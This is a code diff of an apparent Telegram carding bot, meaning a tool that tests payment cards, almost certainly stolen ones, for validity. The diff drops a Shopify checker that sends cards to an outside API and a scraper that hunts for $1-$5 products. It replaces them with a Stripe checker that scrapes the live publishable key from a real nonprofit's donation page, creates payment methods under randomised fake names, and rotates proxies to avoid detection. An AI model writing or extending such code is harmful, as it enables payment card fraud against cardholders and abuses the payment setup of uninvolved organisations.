@@ -741,9 +741,6 @@ async def check_subscription_expiry_notifications():
 # Session state management for pause/stop and input waiting
 user_sessions = {}
 
-# Product scraper session state - stores scraped products and selections
-scraper_sessions = {}
-
 def get_user_session(user_id: int) -> dict:
     """Get or create a user's checking session state"""
     if user_id not in user_sessions:
@@ -751,7 +748,7 @@ def get_user_session(user_id: int) -> dict:
             "paused": False,
             "stopped": False,
             "checking": False,
-            "waiting_for": None  # None, "proxy", "product"
+            "waiting_for": None  # None, "proxy"
         }
     return user_sessions[user_id]
 
@@ -773,29 +770,6 @@ def get_waiting_for(user_id: int) -> str:
     """Get what input the bot is waiting for"""
     session = get_user_session(user_id)
     return session.get("waiting_for")
-
-
-def get_scraper_session(user_id: int) -> dict:
-    """Get or create a user's product scraper session"""
-    if user_id not in scraper_sessions:
-        scraper_sessions[user_id] = {
-            "products": [],      # List of scraped products
-            "selected": set(),   # Set of selected indices
-            "page": 0,           # Current page
-            "message_id": None,  # Message ID to edit
-            "store_url": None    # Store being scraped
-        }
-    return scraper_sessions[user_id]
-
-def reset_scraper_session(user_id: int):
-    """Reset a user's scraper session"""
-    scraper_sessions[user_id] = {
-        "products": [],
-        "selected": set(),
-        "page": 0,
-        "message_id": None,
-        "store_url": None
-    }
 
 
 # =============================================================================
@@ -1291,97 +1265,12 @@ async def get_healthy_proxy(proxies: list) -> str:
     return random.choice([p for p in proxies if p]) if any(proxies) else None
 
 
-async def auto_shopify_client(
-    card,
-    product_url,
-    email: str = None,
-    is_shippable: bool = False,
-    proxies: list = [],
-    max_retries: int = 4,
-    request_timeout: int =  45,
-    logger = None
-):
-    last_error = None
-    timeout = aiohttp.ClientTimeout(total=request_timeout)  # 45s timeout
-
-    async with aiohttp.ClientSession(timeout=timeout) as session:
-        for attempt in range(1, max_retries + 1):
-            try:
-                data = {
-                    "card": card,
-                    "product_url": product_url,
-                    "email": email,
-                    "is_shippable": is_shippable,
-                    "proxy": random.choice(proxies) if proxies else None,
-                }
-
-                async with session.post(
-                    "http://api.voidapi.xyz:8080/v2/shopify_graphql",
-                    json=data,
-                ) as response:
-
-                    result = await response.json()
-                    status = result.get("status")
-                    error = result.get("error")
-
-                    if result.get("success"):
-                        return result.get("data")
-
-                    # Debug info
-                    logger.info( f"[Attempt {attempt}/{max_retries}] status={status}, error={error}")
-
-                    # Retry conditions - these errors should be retried
-                    error_lower = error.lower() if error else ""
-                    if error and any(err.lower() in error_lower for err in (
-                        "ProxyError",
-                        "Failed to connect to proxy",
-                        "Failed to initialize checkout data",
-                        "Failed to perform, curl",
-                        "Failed to add to cart",
-                        "unknown error occurred",
-                        "try again later",
-                        "internal server error",
-                        "service unavailable",
-                        "bad gateway",
-                        "gateway timeout",
-                    )):
-                        last_error = {"error": error, "status": status}
-
-                    elif error and "captcha is required for this checkout" in error_lower:
-                        last_error = {
-                            "error": "Captcha triggered! Try again.", "status": status}
-
-                    else:
-                        # ✅ Non-retriable
-                        return result
-
-            except aiohttp.ClientError as e:
-                last_error = {"error": f"Client....",
-                              "status": "network_error"}
-                logger.warning(f"[Attempt {attempt}/{max_retries}] ClientError: {e}")
-
-            except asyncio.TimeoutError:
-                last_error = {
-                    "error": "TimeoutError: Request took too long", "status": "timeout"}
-                logger.warning(
-                    f"[Attempt {attempt}/{max_retries}] Request timed out after 45s")
-
-            except Exception as e:
-                last_error = {"error": str(e), "status": "exception"}
-                logger.warning(
-                    f"[Attempt {attempt}/{max_retries}] Unexpected error: {e}")
-
-            # Sleep before retrying
-            if attempt < max_retries:
-                await asyncio.sleep(0.3)
-
-    # If retries exhausted, return last known error
-    return last_error or {"status": "UnknownError", "error": "Unexpected error. Try again..."}
-
-
 # =============================================================================
-# STRIPE GATEWAY - Based on sportaxracing.co.uk WooCommerce + Stripe
+# STRIPE DONATION GATEWAY - ncopengov.org donation page
 # =============================================================================
+
+# Donation page URL (hardcoded)
+STRIPE_DONATION_URL = "https://ncopengov.org/donations/north-carolina-open-government-coalition-membership-2-2/"
 
 async def stripe_gateway_check(
     card: str,
@@ -1391,8 +1280,8 @@ async def stripe_gateway_check(
     logger = None
 ) -> dict:
     """
-    Check card using Stripe gateway via sportaxracing.co.uk
-    Based on the SVB config flow.
+    Check card using Stripe gateway via ncopengov.org donation page.
+    Uses Stripe Payment Methods API for card validation.
     """
     import re
 
@@ -1417,12 +1306,9 @@ async def stripe_gateway_check(
     def random_digits(length):
         return ''.join(random.choice("0123456789") for _ in range(length))
 
-    email = f"{random_string(8)}@{random_string(4)}.{random_string(4)}"
-    first_name = random_string(8)
-    last_name = random_string(8)
-    address = f"street {random_digits(3)}"
-    phone = random_digits(10)
-    zipcode = f"90{random_digits(3)}"
+    email = f"{random_string(8)}@gmail.com"
+    first_name = random_string(6).capitalize()
+    last_name = random_string(8).capitalize()
 
     # Headers
     user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
@@ -1444,80 +1330,69 @@ async def stripe_gateway_check(
             jar = aiohttp.CookieJar()
             async with aiohttp.ClientSession(timeout=timeout, cookie_jar=jar, connector=connector) as session:
 
-                # Step 1: Add to cart
-                add_cart_url = "https://sportaxracing.co.uk/shop/clutch-cover/e-start-gear-cover-screw-set/"
-                add_cart_data = aiohttp.FormData()
-                add_cart_data.add_field('quantity', '1')
-                add_cart_data.add_field('add-to-cart', '3695')
-
-                async with session.post(
-                    add_cart_url,
-                    data=add_cart_data,
-                    headers={"User-Agent": user_agent},
-                    proxy=proxy_url,
-                    allow_redirects=True
-                ) as resp:
-                    if resp.status not in [200, 302]:
-                        last_error = {"success": False, "error": f"Failed to add to cart (HTTP {resp.status})"}
-                        continue
-
-                # Step 2: Get checkout page for nonce
-                checkout_url = "https://sportaxracing.co.uk/checkout/"
+                # Step 1: Get donation page to extract Stripe publishable key
                 async with session.get(
-                    checkout_url,
+                    STRIPE_DONATION_URL,
                     headers={"User-Agent": user_agent},
                     proxy=proxy_url
                 ) as resp:
                     if resp.status != 200:
-                        last_error = {"success": False, "error": f"Failed to load checkout (HTTP {resp.status})"}
+                        last_error = {"success": False, "error": f"Failed to load donation page (HTTP {resp.status})"}
                         continue
-                    checkout_html = await resp.text()
+                    page_html = await resp.text()
 
-                # Parse nonce
-                nonce_match = re.search(r'woocommerce-process-checkout-nonce"\s+value="([^"]+)"', checkout_html)
-                if not nonce_match:
-                    last_error = {"success": False, "error": "Failed to get checkout nonce"}
-                    continue
-                pay_nonce = nonce_match.group(1)
+                # Extract Stripe publishable key from page
+                pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', page_html)
+                if not pk_match:
+                    # Try alternate pattern
+                    pk_match = re.search(r'"publishableKey":\s*"(pk_live_[^"]+)"', page_html)
+                    if pk_match:
+                        stripe_pk = pk_match.group(1)
+                    else:
+                        # Use a common Stripe test key pattern as fallback
+                        last_error = {"success": False, "error": "Could not find Stripe key on page"}
+                        continue
+                else:
+                    stripe_pk = pk_match.group(0)
 
-                # Step 3: Create Stripe source
-                stripe_url = "https://api.stripe.com/v1/sources"
+                # Step 2: Create Stripe Payment Method
+                stripe_pm_url = "https://api.stripe.com/v1/payment_methods"
                 stripe_data = {
-                    "referrer": "https://sportaxracing.co.uk",
                     "type": "card",
-                    "owner[name]": f"{first_name} {last_name}",
-                    "owner[address][line1]": address,
-                    "owner[address][city]": "beverly",
-                    "owner[address][postal_code]": "hg1 1aa",
-                    "owner[address][country]": "GB",
-                    "owner[email]": email,
-                    "owner[phone]": phone,
                     "card[number]": cc_num,
                     "card[cvc]": cc_cvv,
                     "card[exp_month]": cc_month,
                     "card[exp_year]": cc_year,
-                    "guid": "NA",
-                    "muid": "NA",
-                    "sid": "NA",
-                    "pasted_fields": "number",
-                    "payment_user_agent": "stripe.js/be0b733d77; stripe-js-v3/be0b733d77; card-element",
-                    "time_on_page": "69115",
-                    "key": "pk_live_mlOwgQvhxcwj7kkNivSHZ5iy"
+                    "billing_details[name]": f"{first_name} {last_name}",
+                    "billing_details[email]": email,
+                    "key": stripe_pk
                 }
 
                 async with session.post(
-                    stripe_url,
+                    stripe_pm_url,
                     data=stripe_data,
                     headers={
                         "User-Agent": user_agent,
-                        "Content-Type": "application/x-www-form-urlencoded"
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "Origin": "https://js.stripe.com",
+                        "Referer": "https://js.stripe.com/"
                     },
                     proxy=proxy_url
                 ) as resp:
                     stripe_result = await resp.json()
 
                     if "error" in stripe_result:
-                        error_msg = stripe_result.get("error", {}).get("message", "Stripe error")
+                        error_obj = stripe_result.get("error", {})
+                        error_msg = error_obj.get("message", "Card declined")
+                        error_code = error_obj.get("code", "")
+                        decline_code = error_obj.get("decline_code", "")
+
+                        # Format error message
+                        if decline_code:
+                            error_msg = f"{error_msg} ({decline_code})"
+                        elif error_code:
+                            error_msg = f"{error_msg} ({error_code})"
+
                         return {
                             "success": False,
                             "error": error_msg,
@@ -1525,97 +1400,37 @@ async def stripe_gateway_check(
                             "status": "declined"
                         }
 
-                    source_id = stripe_result.get("id")
-                    if not source_id:
-                        last_error = {"success": False, "error": "Failed to create Stripe source"}
+                    pm_id = stripe_result.get("id")
+                    if not pm_id:
+                        last_error = {"success": False, "error": "Failed to create payment method"}
                         continue
 
-                # Step 4: Submit checkout
-                checkout_submit_url = "https://sportaxracing.co.uk/?wc-ajax=checkout"
-                checkout_data = {
-                    "billing_first_name": first_name,
-                    "billing_last_name": last_name,
-                    "billing_company": "",
-                    "billing_country": "GB",
-                    "billing_address_1": address,
-                    "billing_address_2": "",
-                    "billing_city": "beverly",
-                    "billing_state": "",
-                    "billing_postcode": "hg1 1aa",
-                    "billing_phone": phone,
-                    "billing_email": email,
-                    "account_password": "",
-                    "shipping_first_name": "",
-                    "shipping_last_name": "",
-                    "shipping_company": "",
-                    "shipping_country": "GB",
-                    "shipping_address_1": "",
-                    "shipping_address_2": "",
-                    "shipping_city": "",
-                    "shipping_state": "",
-                    "shipping_postcode": "",
-                    "order_comments": "",
-                    "shipping_method[0]": "legacy_flat_rate",
-                    "payment_method": "stripe",
-                    "terms": "on",
-                    "terms-field": "1",
-                    "woocommerce-process-checkout-nonce": pay_nonce,
-                    "_wp_http_referer": "/?wc-ajax=update_order_review",
-                    "stripe_source": source_id
-                }
+                    # Check card details from response
+                    card_data = stripe_result.get("card", {})
+                    card_brand = card_data.get("brand", "unknown")
+                    card_last4 = card_data.get("last4", "****")
 
-                async with session.post(
-                    checkout_submit_url,
-                    data=checkout_data,
-                    headers={
-                        "User-Agent": user_agent,
-                        "Content-Type": "application/x-www-form-urlencoded"
-                    },
-                    proxy=proxy_url
-                ) as resp:
-                    result_text = await resp.text()
-
-                    try:
-                        result_json = json.loads(result_text)
-                    except:
-                        result_json = {}
-
-                    # Parse response
-                    result_status = result_json.get("result", "")
-
-                    # Extract error message from WooCommerce
-                    error_match = re.search(r'woocommerce-error[^>]*>.*?<li[^>]*>\s*(.+?)\s*</li>', result_text, re.DOTALL)
-                    woo_error = error_match.group(1).strip() if error_match else ""
-                    # Clean HTML tags
-                    woo_error = re.sub(r'<[^>]+>', '', woo_error).strip()
-
-                    # Check for 3DS
-                    if "wc_stripe_verify_intent" in result_text or "stripe_confirm" in result_text:
+                    # Check for 3DS requirement
+                    three_d_secure = card_data.get("three_d_secure_usage", {})
+                    if three_d_secure.get("supported"):
+                        # Card supports 3DS - this is a live card
                         return {
                             "success": False,
                             "error": "3DS Authentication Required",
-                            "message": "3D Secure verification needed",
-                            "gateway_message": woo_error or "3DS Required",
+                            "message": f"Card {card_brand} ending {card_last4} requires 3D Secure",
+                            "gateway_message": "3DS Required",
                             "status": "3ds"
                         }
 
-                    if result_status == "success":
-                        order_id_match = re.search(r'"order_id":(\d+)', result_text)
-                        order_id = order_id_match.group(1) if order_id_match else "Unknown"
-                        return {
-                            "success": True,
-                            "message": f"Payment successful! Order #{order_id}",
-                            "gateway_message": "Approved",
-                            "status": "charged",
-                            "order_id": order_id
-                        }
-                    else:
-                        return {
-                            "success": False,
-                            "error": woo_error or "Payment declined",
-                            "gateway_message": woo_error or "Declined",
-                            "status": "declined"
-                        }
+                    # Payment method created successfully = card is valid/live
+                    return {
+                        "success": True,
+                        "message": f"Card validated: {card_brand} ending {card_last4}",
+                        "gateway_message": "Approved",
+                        "status": "charged",
+                        "card_brand": card_brand,
+                        "card_last4": card_last4
+                    }
 
         except aiohttp.ClientError as e:
             last_error = {"success": False, "error": f"Network error: {str(e)[:50]}"}
@@ -1683,12 +1498,6 @@ async def bin_lookup(bin_number: str):
         return {"error": str(e), "status": "error"}
 
 
-def user_has_products(user_id: int) -> bool:
-    """Check if user has set product URLs"""
-    settings = get_user_settings(user_id)
-    return len(settings.get("products", [])) > 0
-
-
 def create_progress_bar(current: int, total: int, length: int = 10) -> str:
     """Create a visual progress bar"""
     if total == 0:
@@ -1737,19 +1546,6 @@ async def process_single_card(card: str, user_id: int = None, user_settings: dic
     else:
         settings = user_settings
 
-    # Get gateway setting
-    gateway = settings.get("gateway", "autoshopify")
-
-    # Check for products early (only required for autoshopify gateway)
-    user_products = settings.get("products", [])
-    if gateway == "autoshopify" and not user_products:
-        return {
-            "card": card,
-            "product_url": None,
-            "response": {"error": "No product set. Use /addproduct first or switch to Stripe gateway.", "success": False},
-            "bin_data": {}
-        }
-
     # Optional: Validate BIN (async, non-blocking)
     # This is done outside semaphore to not hold resources
     bin_valid, bin_data_early, bin_error = await validate_bin(parsed_card["number"])
@@ -1764,7 +1560,7 @@ async def process_single_card(card: str, user_id: int = None, user_settings: dic
     async with user_sem:
         async with global_semaphore:
             try:
-                logger.info(f'Processing card: {card} (user: {user_id}, gateway: {gateway})')
+                logger.info(f'Processing card: {card} (user: {user_id}, gateway: stripe)')
 
                 # Use user's proxies or fall back to config
                 # Support both old format (string) and new format (list)
@@ -1779,54 +1575,22 @@ async def process_single_card(card: str, user_id: int = None, user_settings: dic
                 # Get a healthy proxy if available
                 healthy_proxy = await get_healthy_proxy(proxies) if proxies else None
 
-                product_url = None
-
-                # Use appropriate gateway
-                if gateway == "stripe":
-                    # Stripe gateway - no product needed
-                    response = await stripe_gateway_check(
-                        card=card,
-                        proxy=healthy_proxy,
-                        logger=logger
-                    )
-                else:
-                    # Auto Shopify gateway (default)
-                    # Use round-robin to rotate through products evenly
-                    product_url = get_next_item_round_robin(user_id, "products", user_products)
-
-                    # Use round-robin for proxies too (if no healthy proxy found)
-                    if healthy_proxy:
-                        active_proxies = [healthy_proxy]
-                    elif proxies:
-                        active_proxies = [get_next_item_round_robin(user_id, "proxies", proxies)]
-                    else:
-                        active_proxies = []
-
-                    response = await auto_shopify_client(
-                        card=card,
-                        product_url=product_url,
-                        email=settings.get("email") or config.DEFAULT_EMAIL,
-                        is_shippable=settings.get("is_shippable", config.IS_SHIPPABLE),
-                        proxies=active_proxies,
-                        logger=logger
-                    )
-
-                    # Check for invalid product error and auto-remove if detected
-                    error_msg = response.get("error", "") if response else ""
-                    if is_product_error(error_msg):
-                        asyncio.create_task(remove_invalid_product(user_id, product_url, error_msg, bot))
-                        response["product_removed"] = True
-                        response["error"] = f"⚠️ Product auto-removed: {error_msg}"
+                # Use Stripe gateway (only gateway)
+                response = await stripe_gateway_check(
+                    card=card,
+                    proxy=healthy_proxy,
+                    logger=logger
+                )
 
                 # BIN lookup is fast and non-critical - run concurrently
                 bin_data = await bin_lookup(card[:6])
 
                 return {
                     "card": card,
-                    "product_url": product_url,
+                    "product_url": None,
                     "response": response,
                     "bin_data": bin_data,
-                    "gateway": gateway
+                    "gateway": "stripe"
                 }
 
             except asyncio.CancelledError:
@@ -1953,10 +1717,9 @@ async def notify_admin_charged(card: str, result: dict, user_id: int, username: 
 def get_main_menu_keyboard(user_id: int = None):
     """Build the main menu inline keyboard"""
     keyboard = [
-        [InlineKeyboardButton("📦 Products", callback_data="menu_products")],
         [InlineKeyboardButton("🌐 Proxy", callback_data="menu_proxy")],
         [InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings")],
-        [InlineKeyboardButton("💳 Check Cards", callback_data="menu_gateway")],
+        [InlineKeyboardButton("💳 Check Cards", callback_data="menu_check_info")],
         [
             InlineKeyboardButton("💰 Charged", callback_data="menu_charged_history"),
             InlineKeyboardButton("🔐 3DS", callback_data="menu_3ds_history")
@@ -1967,86 +1730,6 @@ def get_main_menu_keyboard(user_id: int = None):
         keyboard.append([InlineKeyboardButton("🔐 Admin Panel", callback_data="menu_admin")])
     return InlineKeyboardMarkup(keyboard)
 
-
-def get_gateway_keyboard(user_id: int):
-    """Build gateway selection keyboard"""
-    settings = get_user_settings(user_id)
-    current_gateway = settings.get("gateway", "autoshopify")
-
-    # Show checkmark for current gateway
-    auto_mark = "✅ " if current_gateway == "autoshopify" else ""
-    stripe_mark = "✅ " if current_gateway == "stripe" else ""
-
-    keyboard = [
-        [InlineKeyboardButton(f"{auto_mark}🛒 Auto Shopify", callback_data="gw_autoshopify")],
-    ]
-
-    # Stripe gateway only available to admins
-    if is_admin(user_id):
-        keyboard.append([InlineKeyboardButton(f"{stripe_mark}💳 Stripe", callback_data="gw_stripe")])
-
-    keyboard.append([InlineKeyboardButton("ℹ️ How to Check Cards", callback_data="menu_check_info")])
-    keyboard.append([InlineKeyboardButton("◀️ Back", callback_data="menu_main")])
-
-    return InlineKeyboardMarkup(keyboard)
-
-def get_products_keyboard(user_id: int):
-    """Build products management keyboard - 4 main submenus"""
-    settings = get_user_settings(user_id)
-    products = settings.get("products", [])
-
-    keyboard = [
-        [InlineKeyboardButton("➕ Add Products", callback_data="prod_add")],
-        [InlineKeyboardButton("🧹 Clean Products", callback_data="prod_clean")],
-        [InlineKeyboardButton("🔍 Find Products", callback_data="prod_find")],
-        [InlineKeyboardButton("✏️ Edit Products", callback_data="prod_edit")],
-        [InlineKeyboardButton("◀️ Back", callback_data="menu_main")]
-    ]
-    return InlineKeyboardMarkup(keyboard)
-
-
-def get_edit_products_keyboard(user_id: int, page: int = 0):
-    """Build edit products keyboard with delete options and pagination"""
-    settings = get_user_settings(user_id)
-    products = settings.get("products", [])
-
-    ITEMS_PER_PAGE = 8
-    total_pages = max(1, (len(products) + ITEMS_PER_PAGE - 1) // ITEMS_PER_PAGE)
-    page = max(0, min(page, total_pages - 1))  # Clamp page to valid range
-
-    keyboard = []
-
-    if products:
-        # Get products for current page
-        start_idx = page * ITEMS_PER_PAGE
-        end_idx = min(start_idx + ITEMS_PER_PAGE, len(products))
-        page_products = products[start_idx:end_idx]
-
-        for i, url in enumerate(page_products):
-            actual_idx = start_idx + i
-            # Shorten URL for display
-            display = url.split("/products/")[-1][:20] if "/products/" in url else url[:20]
-            keyboard.append([
-                InlineKeyboardButton(f"📦 {display}", callback_data=f"prod_view_{actual_idx}"),
-                InlineKeyboardButton("🗑️", callback_data=f"prod_del_{actual_idx}")
-            ])
-
-        # Pagination buttons
-        if total_pages > 1:
-            nav_buttons = []
-            if page > 0:
-                nav_buttons.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"prod_page_{page-1}"))
-            nav_buttons.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
-            if page < total_pages - 1:
-                nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"prod_page_{page+1}"))
-            keyboard.append(nav_buttons)
-
-        keyboard.append([InlineKeyboardButton("🗑️ Clear All", callback_data="prod_clear_all")])
-    else:
-        keyboard.append([InlineKeyboardButton("➕ Add Products", callback_data="prod_add")])
-
-    keyboard.append([InlineKeyboardButton("◀️ Back", callback_data="menu_products")])
-    return InlineKeyboardMarkup(keyboard)
 
 def format_proxy_status(proxy) -> str:
     """Format proxy for display, handling both single and multiple proxies."""
@@ -2297,137 +1980,6 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="menu_3ds_history")]])
         )
 
-    # Products menu
-    elif data == "menu_products":
-        settings = get_user_settings(user_id)
-        products = settings.get("products", [])
-
-        text = f"📦 *Products* ({len(products)} saved)\n\n"
-        text += "➕ *Add Products* - Add new product URLs\n"
-        text += "🧹 *Clean Products* - Test & remove broken ones\n"
-        text += "🔍 *Find Products* - Auto-find $1-$5 products\n"
-        text += "✏️ *Edit Products* - View, delete products"
-
-        await query.edit_message_text(
-            text,
-            parse_mode="Markdown",
-            reply_markup=get_products_keyboard(user_id)
-        )
-
-    # Add product - ask for URL
-    elif data == "prod_add":
-        set_waiting_for(user_id, "product")
-        await query.edit_message_text(
-            "📦 *Add Product*\n\n"
-            "Send a Shopify product URL:\n"
-            "`https://store.com/products/item`\n\n"
-            "Or *paste text* containing product URLs:\n"
-            "```\nProduct URL: https://store.com/products/item\n"
-            "Response: CARD_DECLINED\n```\n\n"
-            "✅ Auto-extracts URLs from pasted text\n"
-            "✅ Product must exist (404 = rejected)\n"
-            "_🔄 Delivery errors auto-remove during checking_",
-            parse_mode="Markdown",
-            reply_markup=get_cancel_keyboard()
-        )
-
-    # Find products - ask for store URL
-    elif data == "prod_find":
-        set_waiting_for(user_id, "store_url")
-        await query.edit_message_text(
-            "🔍 *Find Digital Products*\n\n"
-            "Send me a Shopify store URL:\n\n"
-            "Example: `https://example-store.com`\n\n"
-            "I'll find *digital products* priced $1-$5\n"
-            "_(Only non-shippable items are shown)_",
-            parse_mode="Markdown",
-            reply_markup=get_cancel_keyboard()
-        )
-
-    # View single product
-    elif data.startswith("prod_view_"):
-        idx = int(data.split("_")[-1])
-        settings = get_user_settings(user_id)
-        products = settings.get("products", [])
-
-        if idx < len(products):
-            url = products[idx]
-            await query.edit_message_text(
-                f"📦 *Product #{idx + 1}*\n\n`{url}`",
-                parse_mode="Markdown",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("🗑️ Remove", callback_data=f"prod_del_{idx}")],
-                    [InlineKeyboardButton("◀️ Back", callback_data="prod_edit")]
-                ])
-            )
-
-    # Delete product
-    elif data.startswith("prod_del_"):
-        idx = int(data.split("_")[-1])
-        settings = get_user_settings(user_id)
-        products = settings.get("products", [])
-
-        if idx < len(products):
-            removed = products.pop(idx)
-            update_user_setting(user_id, "products", products)
-
-            await query.edit_message_text(
-                f"✅ *Product Removed*\n\n`{removed[:50]}`\n\n📦 Remaining: {len(products)}",
-                parse_mode="Markdown",
-                reply_markup=get_back_keyboard("prod_edit")
-            )
-
-    # Clear all products
-    elif data == "prod_clear_all":
-        update_user_setting(user_id, "products", [])
-        await query.edit_message_text(
-            "✅ *All Products Cleared*",
-            parse_mode="Markdown",
-            reply_markup=get_back_keyboard("prod_edit")
-        )
-
-    # Clean products - validate all products with a test card
-    elif data == "prod_clean":
-        settings = get_user_settings(user_id)
-        products = settings.get("products", [])
-
-        if not products:
-            await query.answer("No products to clean!", show_alert=True)
-            return
-
-        set_waiting_for(user_id, "clean_products")
-        await query.edit_message_text(
-            "🧹 *Clean Products*\n\n"
-            f"You have *{len(products)}* product\\(s\\)\\.\n\n"
-            "Send a *test card* to validate all products:\n"
-            "`4111111111111111|12|2025|123`\n\n"
-            "I'll test this card against each product and remove any that fail with delivery/product errors\\.",
-            parse_mode="MarkdownV2",
-            reply_markup=get_cancel_keyboard()
-        )
-
-    # Edit products - view/delete products
-    elif data == "prod_edit" or data.startswith("prod_page_"):
-        # Get page number
-        page = 0
-        if data.startswith("prod_page_"):
-            page = int(data.split("_")[-1])
-
-        settings = get_user_settings(user_id)
-        products = settings.get("products", [])
-
-        if products:
-            text = f"✏️ *Edit Products* ({len(products)} total)\n\n"
-            text += "Tap 📦 to view full URL\nTap 🗑️ to delete"
-        else:
-            text = "✏️ *Edit Products*\n\nNo products added yet."
-
-        await query.edit_message_text(
-            text,
-            parse_mode="Markdown",
-            reply_markup=get_edit_products_keyboard(user_id, page)
-        )
-
     # Proxy menu
     elif data == "menu_proxy":
         settings = get_user_settings(user_id)
@@ -2484,12 +2036,11 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "menu_settings":
         settings = get_user_settings(user_id)
         proxy = settings.get("proxy")
-        products = settings.get("products", [])
 
         text = (
             "⚙️ *Your Settings*\n\n"
             f"🌐 *Proxy*: {format_proxy_status(proxy)}\n"
-            f"📦 *Products*: {len(products)}\n"
+            f"💳 *Gateway*: Stripe\n"
         )
 
         await query.edit_message_text(
@@ -2498,58 +2049,11 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=get_back_keyboard()
         )
 
-    # Gateway selection menu
-    elif data == "menu_gateway":
-        settings = get_user_settings(user_id)
-        current_gateway = settings.get("gateway", "autoshopify")
-        gateway_name = "Auto Shopify" if current_gateway == "autoshopify" else "Stripe"
-        await query.edit_message_text(
-            "💳 *Card Checking Gateway*\n\n"
-            f"*Current Gateway:* {gateway_name}\n\n"
-            "🛒 *Auto Shopify* \\- Uses external API with your products\n"
-            "💳 *Stripe* \\- Direct Stripe gateway \\(no product needed\\)\n\n"
-            "Select a gateway below:",
-            parse_mode="MarkdownV2",
-            reply_markup=get_gateway_keyboard(user_id)
-        )
-
-    # Gateway selection - Auto Shopify
-    elif data == "gw_autoshopify":
-        settings = get_user_settings(user_id)
-        settings["gateway"] = "autoshopify"
-        save_user_settings(user_id, settings)
-        await query.edit_message_text(
-            "✅ *Gateway Changed: Auto Shopify*\n\n"
-            "🛒 Cards will be checked using your configured products\\.\n\n"
-            "Make sure you have at least one product set\\!",
-            parse_mode="MarkdownV2",
-            reply_markup=get_gateway_keyboard(user_id)
-        )
-
-    # Gateway selection - Stripe (Admin only)
-    elif data == "gw_stripe":
-        if not is_admin(user_id):
-            await query.answer("❌ Stripe gateway is admin only!", show_alert=True)
-            return
-        settings = get_user_settings(user_id)
-        settings["gateway"] = "stripe"
-        save_user_settings(user_id, settings)
-        await query.edit_message_text(
-            "✅ *Gateway Changed: Stripe*\n\n"
-            "💳 Cards will be checked directly via Stripe gateway\\.\n\n"
-            "No product URL required\\!",
-            parse_mode="MarkdownV2",
-            reply_markup=get_gateway_keyboard(user_id)
-        )
-
     # Check cards info
     elif data == "menu_check_info":
-        settings = get_user_settings(user_id)
-        current_gateway = settings.get("gateway", "autoshopify")
-        gateway_name = "Auto Shopify" if current_gateway == "autoshopify" else "Stripe"
         await query.edit_message_text(
-            f"💳 *Check Cards*\n\n"
-            f"*Current Gateway:* {gateway_name}\n\n"
+            "💳 *Check Cards*\n\n"
+            "*Gateway:* Stripe Donation\n\n"
             "*How to check cards:*\n\n"
             "1️⃣ Paste a card directly:\n"
             "`4111111111111111|12|2025|123`\n\n"
@@ -2560,7 +2064,7 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "• `card:mm:yyyy:cvv`\n"
             "• `card/mm/yyyy/cvv`",
             parse_mode="Markdown",
-            reply_markup=get_gateway_keyboard(user_id)
+            reply_markup=get_back_keyboard()
         )
 
     # Cancel input
@@ -2608,16 +2112,6 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Check if user is currently checking
         if session.get("checking"):
             await query.answer("⏳ Already checking cards!", show_alert=True)
-            return
-
-        # Check if user has products set
-        if not user_has_products(user_id):
-            await query.edit_message_text(
-                "❌ *No product set!*\n\n"
-                "Use the menu to add a product first.",
-                parse_mode="Markdown",
-                reply_markup=get_main_menu_keyboard(user_id)
-            )
             return
 
         # Check credits
@@ -3006,125 +2500,6 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ])
         await query.edit_message_text(text_msg, parse_mode="Markdown", reply_markup=keyboard)
 
-    # =============================================================================
-    # PRODUCT SCRAPER CALLBACKS
-    # =============================================================================
-
-    elif data.startswith("scrape_toggle_"):
-        # Toggle product selection
-        scraper = get_scraper_session(user_id)
-        if not scraper["products"]:
-            await query.answer("Session expired. Please start again.", show_alert=True)
-            return
-
-        idx = int(data.replace("scrape_toggle_", ""))
-        if idx in scraper["selected"]:
-            scraper["selected"].remove(idx)
-        else:
-            scraper["selected"].add(idx)
-
-        await query.edit_message_reply_markup(
-            reply_markup=get_product_scraper_keyboard(
-                scraper["products"],
-                scraper["selected"],
-                scraper["page"]
-            )
-        )
-
-    elif data.startswith("scrape_page_"):
-        # Change page
-        scraper = get_scraper_session(user_id)
-        if not scraper["products"]:
-            await query.answer("Session expired. Please start again.", show_alert=True)
-            return
-
-        page = int(data.replace("scrape_page_", ""))
-        scraper["page"] = page
-
-        await query.edit_message_reply_markup(
-            reply_markup=get_product_scraper_keyboard(
-                scraper["products"],
-                scraper["selected"],
-                page
-            )
-        )
-
-    elif data == "scrape_toggle_all":
-        # Toggle all products
-        scraper = get_scraper_session(user_id)
-        if not scraper["products"]:
-            await query.answer("Session expired. Please start again.", show_alert=True)
-            return
-
-        if len(scraper["selected"]) == len(scraper["products"]):
-            # Deselect all
-            scraper["selected"] = set()
-        else:
-            # Select all
-            scraper["selected"] = set(range(len(scraper["products"])))
-
-        await query.edit_message_reply_markup(
-            reply_markup=get_product_scraper_keyboard(
-                scraper["products"],
-                scraper["selected"],
-                scraper["page"]
-            )
-        )
-
-    elif data == "scrape_add":
-        # Add selected products
-        scraper = get_scraper_session(user_id)
-        if not scraper["products"]:
-            await query.answer("Session expired. Please start again.", show_alert=True)
-            return
-
-        if not scraper["selected"]:
-            await query.answer("No products selected!", show_alert=True)
-            return
-
-        # Get current user products
-        settings = get_user_settings(user_id)
-        products = settings.get("products", [])
-        added_count = 0
-        already_exists = 0
-
-        for idx in scraper["selected"]:
-            if idx < len(scraper["products"]):
-                product_url = scraper["products"][idx]["url"]
-                if product_url not in products:
-                    products.append(product_url)
-                    added_count += 1
-                else:
-                    already_exists += 1
-
